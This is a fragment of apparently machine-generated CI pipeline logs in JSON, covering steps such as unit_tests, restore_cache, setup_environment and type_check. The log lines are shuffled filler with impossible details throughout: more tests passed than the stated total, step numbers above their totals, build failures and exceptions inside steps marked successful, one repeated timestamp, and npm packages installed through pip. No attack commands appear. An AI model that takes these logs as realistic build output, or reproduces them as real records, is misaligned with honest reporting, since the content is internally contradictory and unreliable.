          "[12:19:13] DEBUG: Connection pool: 4 active",
          "GET /api - 200 (14ms)",
          "npm install: resolved 487 packages",
          "[12:19:13] DEBUG: Initializing service",
          "Minifying app.js",
          "yarn add: Done in 8.84s",
          "Step 3/24: Linting",
          "GET /health - 200 (91ms)",
          "Uploading artifact 'build' (25 files)",
          "Step 11/24: Installing dependencies",
          "[12:19:13] DEBUG: Memory usage: 1445MB",
          "\u2713 Step 'test' succeeded",
          "Finished.",
          "GET /status - 200 (48ms)",
          "Image pulled successfully",
          "Minifying main.js",
          "Step 3/23: Linting",
          "Cache hit for key-3775",
          "Using Node.js 20.14.5",
          "npm notice: package.json updated",
          "Checking out main branch",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:19:13] INFO: Processing request",
          "Checking out develop branch",
          "Fetching submodules...",
          "Time: 115.780s",
          "Generating source maps...",
          "Building Docker image...",
          "Step 12/17: Running migrations",
          "[12:19:13] DEBUG: Memory usage: 1447MB",
          "Compiling src/index.js...",
          "WARNING: webpack has known vulnerabilities",
          "Already up to date.",
          "npm notice: package.json updated",
          "npm notice: package.json updated",
          "Success!",
          "GET /health - 200 (93ms)",
          "[12:19:13] DEBUG: Initializing service",
          "Ran 126 tests in 29s",
          "Step 8/17: Running migrations",
          "NODE_ENV=production",
          "WARNING: axios has known vulnerabilities",
          "Processing...",
          "OK",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Connection established",
          "Test Suites: 26 passed, 7 total",
          "npm notice: package.json updated",
          "Uploading artifact 'dist' (46 files)",
          "OK",
          "Loading...",
          "[12:19:13] DEBUG: Loading configuration",
          "WARNING: lodash has known vulnerabilities",
          "npm notice: package.json updated",
          "Cache hit for key-4900",
          "Optimizing 48 modules...",
          "Compiling src/utils.go...",
          "Compiling utils/index.js...",
          "pip: Downloading lodash-2.8.tar.gz",
          "Time: 91.211s",
          "npm install: added 167 packages",
          "Artifact uploaded: dist.zip (5MB)",
          "Compiling utils/main.py...",
          "Waiting...",
          "Artifact uploaded: dist.zip (11MB)",
          "[12:19:13] INFO: Request completed",
          "Ready.",
          "Checking out master branch",
          "Using Python 3.12",
          "npm install: added 56 packages",
          "TLS handshake completed",
          "yarn add: Done in 17.20s",
          "Connecting to example.com:443...",
          "Processing...",
          "[12:19:13] DEBUG: Memory usage: 1863MB",
          "POST /data - 200 (461ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Processing...",
          "Uploading artifact 'dist' (26 files)",
          "yarn add: Done in 13.44s",
          "\u2713 Step 'checkout' succeeded",
          "Step 10/23: Building",
          "[12:19:13] WARN: Deprecated API usage",
          "[12:19:13] DEBUG: Initializing service",
          "npm install: added 291 packages",
          "Uploading artifact 'coverage' (46 files)",
          "Waiting...",
          "[12:19:13] INFO: Connecting to database",
          "Ready.",
          "Using Node.js 18.9.9",
          "Pushing to registry...",
          "Pushing to registry...",
          "Building Docker image...",
          "Tests: 328 passed, 238 total",
          "Step 20/16: Running migrations",
          "Step 6/21: Running migrations",
          "Optimizing 56 modules...",
          "yarn add: Done in 3.11s",
          "Processing...",
          "Artifact uploaded: dist.zip (78MB)",
          "Test Suites: 18 passed, 23 total",
          "Completed.",
          "Image pulled successfully",
          "pip install: Successfully installed axios-2.2",
          "Environment: development",
          "Loading...",
          "Cache restored successfully (325MB)",
          "POST /upload - 200 (193ms)",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "pip install: Successfully installed axios-2.19",
          "yarn add: Done in 12.93s",
          "Exception: ValueError",
          "Cache invalidated: build",
          "Environment: production",
          "Pushing to registry...",
          "Bundling main.css",
          "Artifact downloaded: 35MB",
          "[12:19:13] DEBUG: Initializing service",
          "Step 15/23: Building",
          "Verifying...",
          "Ready.",
          "[12:19:13] INFO: Request completed",
          "Waiting...",
          "\u2713 Step 'test' succeeded",
          "  PASS: integration/test_api_health.spec.js",
          "Minifying main.js",
          "[12:19:13] INFO: Cache refreshed",
          "Building Docker image...",
          "Platform: win32-x64",
          "[12:19:13] INFO: Starting build process",
          "  PASS: integration/test_cache_hit.spec.js",
          "Ran 18 tests in 3s",
          "Step 10/25: Building",
          "Ready.",
          "[12:19:13] DEBUG: Memory usage: 1406MB",
          "Compiling utils/utils.go...",
          "Step 6/22: Deploying",
          "  PASS: test_api_health (264ms)",
          "NODE_ENV=test",
          "Using Node.js 18.9.9",
          "Step 2/22: Testing",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "[12:19:13] DEBUG: Memory usage: 163MB",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-19T12:20:43.594114",
        "finished_at": "2025-12-19T12:21:26.065072",
        "log_lines": [
          "=== Step: unit_tests ===",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /upload - 201 (176ms)",
          "Artifact uploaded: dist.zip (95MB)",
          "Cache restored successfully (132MB)",
          "Compiling components/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "OK",
          "HEAD is now at afef533",
          "Step 11/17: Installing dependencies",
          "Time: 78.539s",
          "  PASS: integration/test_db_connect.spec.js",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Already up to date.",
          "[12:19:13] INFO: Connecting to database",
          "[12:19:13] INFO: Processing request",
          "Ran 61 tests in 11s",
          "[12:19:13] DEBUG: Initializing service",
          "[12:19:13] DEBUG: Connection pool: 2 active",
          "Test Suites: 8 passed, 7 total",
          "Step 2/24: Testing",
          "Cache invalidated: dependencies",
          "Step 18/22: Testing",
          "Building Docker image...",
          "Pushing to registry...",
          "Cache restored successfully (221MB)",
          "WARNING: react has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_api_health (10ms)",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "pip: Collecting react",
          "POST /api - 202 (116ms)",
          "Artifact uploaded: dist.zip (85MB)",
          "[12:19:13] WARN: Deprecated API usage",
          "Installing express@2.1.0",
          "[12:19:13] INFO: Starting build process",
          "WARNING: lodash has known vulnerabilities",
          "Step 9/22: Testing",
          "pip: Installing build dependencies...",
          "Checking out master branch",
          "Step 8/22: Building",
          "Processing...",
          "Cache miss for key-1876",
          "pip: Collecting express",
          "Snapshots: 2 passed, 48 total",
          "Cache restored successfully (85MB)",
          "[12:19:13] INFO: Starting build process",
          "Cache invalidated: build",
          "npm install: resolved 1968 packages",
          "pip install: Successfully installed lodash-2.20",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ran 153 tests in 35s",
          "GET /status - 201 (8ms)",
          "Using Node.js 18.3.9",
          "Loading...",
          "Done.",
          "Step 14/15: Deploying",
          "Installing webpack@3.6.0",
          "npm notice: created a lockfile",
          "Environment: production",
          "Step 2/25: Installing dependencies",
          "Artifact downloaded: 32MB",
          "Uploading artifact 'build' (4 files)",
          "Building Docker image...",
          "Connecting to cloud.services:443...",
          "[12:19:13] INFO: Request completed",
          "[12:19:13] DEBUG: Connection pool: 6 active",
          "GET /health - 204 (54ms)",
          "Fetching submodules...",
          "pip: Downloading lodash-4.5.tar.gz",
          "Compiling src/app.ts...",
          "Connecting to acme.corp:443...",
          "[12:19:13] INFO: Starting build process",
          "Test Suites: 50 passed, 18 total",
          "pip: Collecting jest",
          "[12:19:13] WARN: Deprecated API usage",
          "  PASS: test_api_health (194ms)",
          "Cache restored successfully (37MB)",
          "\u2713 All checks passed",
          "[12:19:13] DEBUG: Memory usage: 294MB",
          "[12:19:13] DEBUG: Connection pool: 2 active",
          "Installing axios@1.5.0",
          "Exception: TypeError",
          "Step 18/16: Deploying",
          "Optimizing 18 modules...",
          "Pushing to registry...",
          "WARNING: prettier has known vulnerabilities",
          "Optimizing 82 modules...",
          "Cache hit for key-7310",
          "pip: Collecting express",
          "Step 5/21: Installing dependencies",
          "Installing webpack@3.1.9",
          "Cache restored successfully (452MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:13] WARN: Deprecated API usage",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: resolved 1255 packages",
          "Using Node.js 17.18.2",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "[12:19:13] ERROR: Connection failed",
          "Step 19/22: Linting",
          "TLS handshake completed",
          "pip: Downloading react-4.4.tar.gz",
          "Layer 5/12: ENV command",
          "Loading...",
          "Optimizing 31 modules...",
          "Image pulled successfully",
          "Pushing to registry...",
          "Artifact downloaded: 19MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:13] INFO: Processing request",
          "npm install: added 88 packages",
          "pip: Installing build dependencies...",
          "Verifying...",
          "TLS handshake completed",
          "Bundling runtime.js",
          "Using Node.js 15.9.1",
          "Verifying...",
          "POST /upload - 201 (254ms)",
          "Cache restored successfully (404MB)",
          "Test Suites: 17 passed, 8 total",
          "pip: Downloading webpack-5.17.tar.gz",
          "[12:19:13] DEBUG: Initializing service",
          "Transforming 258 files...",
          "Waiting...",
          "Cache saved successfully",
          "Compiling src/utils.go...",
          "Building Docker image...",
          "Transforming 648 files...",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Creating production build...",
          "Pushing to registry...",
          "Success!",
          "  PASS: test_api_health (420ms)",
          "Loading...",
          "Step 20/24: Installing dependencies",
          "[12:19:13] INFO: Processing request",
          "Cache hit for key-7576",
          "Environment: development",
          "npm notice: created a lockfile",
          "npm install: added 330 packages",
          "WARNING: express has known vulnerabilities",
          "Platform: darwin-arm64",
          "Connection established",
          "Finished.",
          "HEAD is now at 5f2fcee",
          "[12:19:13] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (63MB)",
          "Cache saved successfully",
          "[12:19:13] DEBUG: Memory usage: 588MB",
          "[12:19:13] INFO: Processing request",
          "\u2713 Step 'setup' succeeded",
          "pip: Installing build dependencies...",
          "Step 6/24: Deploying",
          "Done.",
          "Generating source maps...",
          "\u2713 Task completed in 4624ms",
          "[12:19:13] INFO: Processing request",
          "Environment: development",
          "pip: Installing build dependencies...",
          "Optimizing 47 modules...",
          "\u2717 build failed with exit code 36",
          "Waiting...",
          "Building Docker image...",
          "Already up to date.",
          "Waiting...",
          "Finished.",
          "pip install: Successfully installed jest-3.15",
          "Step 15/15: Testing",
          "Snapshots: 37 passed, 8 total",
          "[12:19:13] INFO: Connecting to database",
          "npm install: added 165 packages",
          "[12:19:13] INFO: Starting build process",
          "Step 10/19: Installing dependencies",
          "Bundling vendor.css",
          "[12:19:13] WARN: Deprecated API usage",
          "\u2713 Task completed in 2836ms",
          "Cache hit for key-7431",
          "Step 6/19: Installing dependencies",
          "Using Python 3.11",
          "Step 9/19: Installing dependencies",
          "[12:19:13] INFO: Connecting to database",
          "Step 4/19: Deploying",
          "Uploading artifact 'dist' (42 files)",
          "Creating production build...",
          "Pulling image: alpine:18",
          "WARNING: lodash has known vulnerabilities",
          "Generating source maps...",
          "WARNING: react has known vulnerabilities",
          "\u2713 All checks passed",
          "Exception: NullPointerException",
          "Uploading artifact 'coverage' (42 files)",
          "Step 13/21: Linting",
          "Environment: development",
          "Success!",
          "Test Suites: 32 passed, 37 total",
          "\u2713 Step 'checkout' succeeded",
          "Using Node.js 18.13.2",
          "Cache invalidated: node_modules",
          "Cache restored successfully (192MB)",
          "Compiling src/main.py...",
          "\u2713 Step 'build' succeeded",
          "[12:19:13] DEBUG: Connection pool: 11 active",
          "GET /health - 204 (69ms)",
          "Building Docker image...",
          "\u2713 All checks passed",
          "Time: 23.719s",
          "Loading...",
          "  PASS: test_user_create (398ms)",
          "yarn add: Done in 30.6s",
          "[12:19:13] INFO: Starting build process",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Installing jest@5.6.5",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 Step 'setup' succeeded",
          "Artifact uploaded: dist.zip (47MB)",
          "Already up to date.",
          "  PASS: test_cache_hit (108ms)",
          "[12:19:13] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "[12:19:13] WARN: Deprecated API usage",
          "Artifact downloaded: 38MB",
          "Cache miss for key-6979",
          "Artifact downloaded: 28MB",
          "\u2713 Task completed in 4130ms",
          "Cache restored successfully (163MB)",
          "Step 8/21: Running migrations",
          "yarn add: Done in 27.5s",
          "Step 16/19: Linting",
          "pip: Installing build dependencies...",
          "Step 8/20: Testing",
          "Bundling runtime.js",
          "Processing...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-19T12:21:26.065072",
        "finished_at": "2025-12-19T12:21:34.559264",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Step 19/21: Deploying",
          "Snapshots: 43 passed, 2 total",
          "Pulling image: node:latest",
          "Done.",
          "Cache invalidated: dependencies",
          "Switched to branch 'feature/task-785'",
          "npm notice: package.json updated",
          "[12:19:13] ERROR: Connection failed",
          "POST /data - 200 (48ms)",
          "Optimizing 60 modules...",
          "Generating source maps...",
          "Checking out main branch",
          "OK",
          "Already up to date.",
          "[12:19:13] INFO: Cache refreshed",
          "NODE_ENV=production",
          "TLS handshake completed",
          "Environment: test",
          "HEAD is now at d5817f6",
          "Step 1/20: Deploying",
          "Done.",
          "Creating production build...",
          "Building Docker image...",
          "Step 3/17: Testing",
          "Time: 63.75s",
          "Generating source maps...",
          "Completed.",
          "Switched to branch 'feature/task-439'",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact downloaded: 50MB",
          "HEAD is now at 806ba0a",
          "Environment: production",
          "[12:19:13] DEBUG: Connection pool: 15 active",
          "Checking out master branch",
          "Cache invalidated: build",
          "Waiting...",
          "Environment: staging",
          "Image pulled successfully",
          "[12:19:13] DEBUG: Memory usage: 1218MB",
          "FAILED: test_auth_login",
          "pip install: Successfully installed lodash-4.20",
          "[12:19:13] DEBUG: Memory usage: 1288MB",
          "[12:19:13] ERROR: Connection failed",
          "NODE_ENV=test",
          "Using Node.js 15.18.3",
          "Compiling utils/service.java...",
          "[12:19:13] DEBUG: Connection pool: 20 active",
          "Installing lodash@5.8.8",
          "Cache hit for key-2674",
          "[12:19:13] WARN: Deprecated API usage",
          "pip install: Successfully installed eslint-4.10",
          "Artifact downloaded: 14MB",
          "[12:19:13] DEBUG: Memory usage: 1354MB",
          "Artifact downloaded: 31MB",
          "Uploading artifact 'coverage' (48 files)",
          "Compiling lib/main.py...",
          "Artifact downloaded: 21MB",
          "Cache saved successfully",
          "Pushing to registry...",
          "Step 13/23: Running migrations",
          "Loading...",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "Checking out master branch",
          "[12:19:13] ERROR: Connection failed",
          "pip: Downloading react-1.19.tar.gz",
          "Switched to branch 'hotfix/task-590'",
          "Environment: staging",
          "Platform: darwin-arm64",
          "Waiting...",
          "Cache saved successfully",
          "Optimizing 97 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Success!",
          "Step 1/19: Deploying",
          "Platform: darwin-arm64",
          "\u2713 All checks passed",
          "Optimizing 67 modules...",
          "[12:19:13] DEBUG: Loading configuration",
          "TLS handshake completed",
          "\u2713 Task completed in 4981ms",
          "Pushing to registry...",
          "Using Python 3.12",
          "  PASS: test_user_create (361ms)",
          "Connecting to startup.dev:443...",
          "[12:19:13] DEBUG: Query executed in 53ms",
          "Snapshots: 37 passed, 27 total",
          "Uploading artifact 'dist' (14 files)",
          "GET /health - 201 (53ms)",
          "Fetching submodules...",
          "HEAD is now at 092bec4",
          "Installing express@5.3.0",
          "Pushing to registry...",
          "npm notice: created a lockfile",
          "WARNING: lodash has known vulnerabilities",
          "pip: Installing build dependencies...",
          "[12:19:13] DEBUG: Memory usage: 200MB",
          "Test Suites: 33 passed, 9 total",
          "Cache restored successfully (79MB)",
          "  PASS: test_cache_hit (491ms)",
          "Connection established",
          "[12:19:13] DEBUG: Loading configuration",
          "Environment: test",
          "Step 5/22: Building",
          "HEAD is now at a24b499",
          "Step 16/19: Testing",
          "Snapshots: 39 passed, 20 total",
          "\u2713 All checks passed",
          "Coverage: 94% statements, 95% branches",
          "Compiling lib/app.ts...",
          "Transforming 390 files...",
          "[12:19:13] INFO: Starting build process",
          "pip: Collecting lodash",
          "Ready.",
          "Compiling components/handler.rs...",
          "[12:19:13] DEBUG: Query executed in 75ms",
          "yarn add: Done in 15.23s",
          "\u2713 Step 'test' succeeded",
          "npm install: resolved 832 packages",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling components/main.py...",
          "OK",
          "pip: Downloading axios-3.14.tar.gz",
          "WARNING: eslint has known vulnerabilities",
          "Test Suites: 37 passed, 14 total",
          "Step 15/23: Running migrations",
          "Building Docker image...",
          "npm notice: package.json updated",
          "Step 2/25: Testing",
          "[12:19:13] DEBUG: Initializing service",
          "Step 11/22: Building",
          "Step 18/23: Deploying",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Minifying vendor.js",
          "Coverage: 92% statements, 65% branches",
          "Step 9/19: Building",
          "Ready.",
          "WARNING: axios has known vulnerabilities",
          "Step 3/17: Installing dependencies",
          "Already up to date.",
          "npm notice: created a lockfile",
          "Time: 120.436s",
          "Step 3/17: Running migrations",
          "\u2713 All checks passed",
          "pip: Downloading lodash-5.3.tar.gz",
          "Building Docker image...",
          "Ran 172 tests in 11s",
          "[12:19:13] DEBUG: Memory usage: 1657MB",
          "Time: 76.331s",
          "Artifact downloaded: 22MB",
          "Using Python 3.11",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Connecting to example.com:443...",
          "\u2713 Step 'setup' succeeded",
          "Completed.",
          "Time: 117.537s",
          "Using Python 3.10",
          "Step 11/18: Deploying",
          "Optimizing 14 modules...",
          "WARNING: react has known vulnerabilities",
          "yarn add: Done in 20.11s",
          "[12:19:13] DEBUG: Connection pool: 1 active",
          "Installing express@4.4.7",
          "Transforming 791 files...",
          "Step 4/15: Testing",
          "Step 3/23: Linting",
          "Checking out develop branch",
          "TLS handshake completed",
          "Step 6/21: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:13] DEBUG: Loading configuration",
          "Transforming 851 files...",
          "\u2713 Step 'install' succeeded",
          "OK",
          "Exception: NullPointerException",
          "Artifact downloaded: 23MB",
          "  PASS: e2e/test_auth_login.spec.js",
          "WARNING: eslint has known vulnerabilities",
          "npm install: resolved 876 packages",
          "Exception: RuntimeError",
          "Time: 21.368s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Uploading artifact 'coverage' (37 files)",
          "Loading...",
          "\u2713 All checks passed",
          "[12:19:13] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: node_modules",
          "\u2713 lint completed",
          "Ran 144 tests in 12s",
          "Coverage: 90% statements, 79% branches",
          "Time: 6.587s",
          "Creating production build...",
          "Step 15/22: Testing",
          "yarn add: Done in 24.81s",
          "OK",
          "Done.",
          "[12:19:13] DEBUG: Memory usage: 743MB",
          "  PASS: test_user_create (143ms)",
          "Ready.",
          "Building Docker image...",
          "Cache restored successfully (389MB)",
          "Artifact downloaded: 45MB",
          "Completed.",
          "[12:19:13] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Time: 48.498s",
          "Loading...",
          "Uploading artifact 'coverage' (36 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Task completed in 4224ms",
          "Installing lodash@5.4.10",
          "OK",
          "Step 3/23: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed express-2.16",
          "Time: 25.993s",
          "Using Python 3.9",
          "\u2713 test completed",
          "Using Python 3.11",
          "yarn add: Done in 18.76s",
          "Cache restored successfully (220MB)",
          "[12:19:13] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (57MB)",
          "Installing react@1.7.10",
          "npm install: resolved 670 packages",
          "Checking out develop branch",
          "[12:19:13] DEBUG: Initializing service",
          "\u2713 Step 'test' succeeded",
          "\u2713 All checks passed",
          "Installing lodash@4.5.10",
          "Layer 7/15: RUN command",
          "Fetching submodules...",
          "[12:19:13] DEBUG: Memory usage: 144MB",
          "Step 16/24: Deploying",
          "Fetching submodules...",
          "WARNING: eslint has known vulnerabilities",
          "Compiling utils/service.java...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-19T12:21:34.559264",
        "finished_at": "2025-12-19T12:21:48.716250",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Building Docker image...",
          "pip: Downloading jest-1.3.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:13] INFO: Starting build process",
          "OK",
          "Building Docker image...",
          "NODE_ENV=test",
          "Snapshots: 26 passed, 4 total",
          "\u2713 Task completed in 3605ms",
          "Using Python 3.10",
          "Cache miss for key-5211",
          "Connection established",
          "Exception: RuntimeError",
          "Exception: NullPointerException",
          "[12:19:13] INFO: Processing request",
          "[12:19:13] INFO: Starting build process",
          "Bundling styles.css",
          "  PASS: e2e/test_cache_hit.spec.js",
          "WARNING: lodash has known vulnerabilities",
          "GET /api - 201 (41ms)",
          "[12:19:13] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 110",
          "\u2713 deploy completed",
          "Fetching submodules...",
          "Building Docker image...",
          "Connecting to example.com:443...",
          "\u2713 build completed",
          "[12:19:13] INFO: Request completed",
          "Environment: development",
          "Optimizing 51 modules...",
          "  PASS: test_auth_login (254ms)",
          "Time: 59.353s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:13] INFO: Processing request",
          "[12:19:13] WARN: Deprecated API usage",
          "Connecting to startup.dev:443...",
          "Cache saved successfully",
          "Cache saved successfully",
          "Transforming 995 files...",
          "[12:19:13] INFO: Connecting to database",
          "OK",
          "[12:19:13] INFO: Cache refreshed",
          "[12:19:13] DEBUG: Memory usage: 1813MB",
          "Minifying vendor.js",
          "Installing react@2.16.8",
          "Compiling utils/index.js...",
          "[12:19:13] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Success!",
          "npm install: added 292 packages",
          "Step 10/25: Deploying",
          "Success!",
          "npm install: resolved 598 packages",
          "Tests: 193 passed, 322 total",
          "Verifying...",
          "Already up to date.",
          "Verifying...",
          "[12:19:13] DEBUG: Initializing service",
          "[12:19:13] INFO: Starting build process",
          "Installing webpack@4.20.6",
          "\u2713 Step 'build' succeeded",
          "Using Python 3.10",
          "Using Node.js 19.9.6",
          "Already up to date.",
          "Waiting...",
          "[12:19:13] INFO: Connecting to database",
          "Step 14/20: Running migrations",
          "pip install: Successfully installed express-5.4",
          "Switched to branch 'hotfix/task-805'",
          "Step 14/24: Deploying",
          "\u2713 Task completed in 3702ms",
          "Success!",
          "Optimizing 76 modules...",
          "Cache restored successfully (195MB)",
          "Layer 9/14: COPY command",
          "Minifying app.js",
          "npm notice: created a lockfile",
          "Step 12/22: Deploying",
          "Cache restored successfully (372MB)",
          "Coverage: 80% statements, 82% branches",
          "[12:19:13] INFO: Request completed",
          "Platform: linux-x64",
          "[12:19:13] INFO: Cache refreshed",
          "Cache miss for key-2989",
          "Completed.",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Time: 32.215s",
          "[12:19:13] INFO: Request completed",
          "[12:19:13] INFO: Connecting to database",
          "Already up to date.",
          "[12:19:13] DEBUG: Loading configuration",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Task completed in 2292ms",
          "npm install: added 266 packages",
          "WARNING: react has known vulnerabilities",
          "GET /api - 200 (93ms)",
          "[12:19:13] ERROR: Connection failed",
          "Environment: test",
          "Using Python 3.9",
          "Environment: development",
          "[12:19:13] DEBUG: Connection pool: 8 active",
          "Step 17/22: Testing",
          "yarn add: Done in 16.61s",
          "[12:19:13] INFO: Processing request",
          "pip install: Successfully installed jest-1.8",
          "Cache restored successfully (58MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "Compiling components/app.ts...",
          "Using Node.js 15.10.2",
          "POST /data - 200 (235ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache saved successfully",
          "[12:19:13] INFO: Starting build process",
          "TLS handshake completed",
          "Waiting...",
          "  PASS: unit/test_db_connect.spec.js",
          "Exception: NullPointerException",
          "npm install: resolved 1314 packages",
          "Switched to branch 'bugfix/task-706'",
          "Tests: 197 passed, 317 total",
          "WARNING: eslint has known vulnerabilities",
          "Uploading artifact 'dist' (21 files)",
          "pip install: Successfully installed eslint-3.10",
          "Tests: 217 passed, 411 total",
          "Connecting to example.com:443...",
          "Building Docker image...",
          "Bundling main.js",
          "Step 2/18: Running migrations",
          "Success!",
          "Time: 8.335s",
          "\u2713 All checks passed",
          "Step 17/20: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Test Suites: 44 passed, 27 total",
          "npm install: added 248 packages",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 Task completed in 2786ms",
          "[12:19:13] WARN: Deprecated API usage",
          "[12:19:13] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: resolved 1935 packages",
          "[12:19:13] INFO: Starting build process",
          "Compiling lib/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "POST /data - 202 (86ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Done.",
          "[12:19:13] DEBUG: Query executed in 32ms",
          "[12:19:13] WARN: Deprecated API usage",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-1260",
          "\u2713 lint completed",
          "Step 11/20: Deploying",
          "Cache invalidated: dependencies",
          "Waiting...",
          "[12:19:13] INFO: Processing request",
          "\u2713 Step 'setup' succeeded",
          "Snapshots: 25 passed, 36 total",
          "Cache invalidated: node_modules",
          "pip: Downloading lodash-1.5.tar.gz",
          "Step 15/25: Linting",
          "WARNING: prettier has known vulnerabilities",
          "Coverage: 76% statements, 74% branches",
          "npm notice: created a lockfile",
          "Using Node.js 16.19.1",
          "Test Suites: 6 passed, 28 total",
          "Image pulled successfully",
          "pip install: Successfully installed express-1.5",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 test completed",
          "[12:19:13] ERROR: Connection failed",
          "Processing...",
          "[12:19:13] DEBUG: Initializing service",
          "Creating production build...",
          "Connection established",
          "Tests: 390 passed, 483 total",
          "yarn add: Done in 10.38s",
          "OK",
          "TLS handshake completed",
          "pip: Downloading prettier-1.2.tar.gz",
          "Platform: win32-x64",
          "  PASS: test_db_connect (370ms)",
          "Ran 78 tests in 9s",
          "[12:19:13] WARN: Deprecated API usage",
          "Loading...",
          "npm install: resolved 774 packages",
          "[12:19:13] INFO: Request completed",
          "WARNING: jest has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Pulling image: alpine:18",
          "[12:19:13] INFO: Connecting to database",
          "Using Node.js 17.16.2",
          "OK",
          "Ready.",
          "Image pulled successfully",
          "Switched to branch 'hotfix/task-495'",
          "Compiling lib/handler.rs...",
          "WARNING: axios has known vulnerabilities",
          "Uploading artifact 'dist' (40 files)",
          "Compiling lib/handler.rs...",
          "Generating source maps...",
          "Pulling image: node:3.11",
          "Time: 90.614s",
          "Time: 96.615s",
          "Time: 71.202s",
          "Checking out develop branch",
          "GET /health - 204 (57ms)",
          "Snapshots: 45 passed, 47 total",
          "npm install: resolved 561 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Building Docker image...",
          "Time: 5.444s",
          "npm install: resolved 1939 packages",
          "Cache restored successfully (241MB)",
          "Step 19/23: Building",
          "[12:19:13] DEBUG: Connection pool: 7 active",
          "Cache restored successfully (170MB)",
          "WARNING: prettier has known vulnerabilities",
          "Pulling image: node:latest",
          "Cache invalidated: node_modules",
          "Step 12/22: Building",
          "[12:19:13] DEBUG: Memory usage: 1465MB",
          "Ran 56 tests in 36s",
          "Connecting to cloud.services:443...",
          "  PASS: integration/test_api_health.spec.js",
          "Artifact uploaded: dist.zip (24MB)",
          "Bundling runtime.css",
          "Pushing to registry...",
          "\u2713 validate completed",
          "\u2713 Task completed in 103ms",
          "[12:19:13] INFO: Cache refreshed",
          "yarn add: Done in 30.93s",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact downloaded: 36MB",
          "[12:19:13] WARN: Deprecated API usage",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-19T12:21:48.716250",
        "finished_at": "2025-12-19T12:22:02.873236",
        "log_lines": [
          "=== Step: type_check ===",
          "Optimizing 14 modules...",
          "Installing eslint@1.15.6",
          "Compiling src/app.ts...",
          "Connection established",
          "[12:19:13] INFO: Processing request",
          "Pushing to registry...",
          "[12:19:13] DEBUG: Initializing service",
          "Success!",
          "Checking out develop branch",
          "\u2717 build failed with exit code 35",
          "HEAD is now at 3d2815d",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "GET /health - 201 (97ms)",
          "Minifying app.js",
          "[12:19:13] INFO: Connecting to database",
          "Cache saved successfully",
          "Already up to date.",
          "[12:19:13] INFO: Connecting to database",
          "[12:19:13] DEBUG: Loading configuration",
          "Cache miss for key-2249",
          "Success!",
          "Finished.",
          "[12:19:13] INFO: Request completed",
          "pip: Collecting webpack",
          "POST /data - 202 (58ms)",
          "[12:19:13] DEBUG: Query executed in 70ms",
          "\u2713 Task completed in 1100ms",
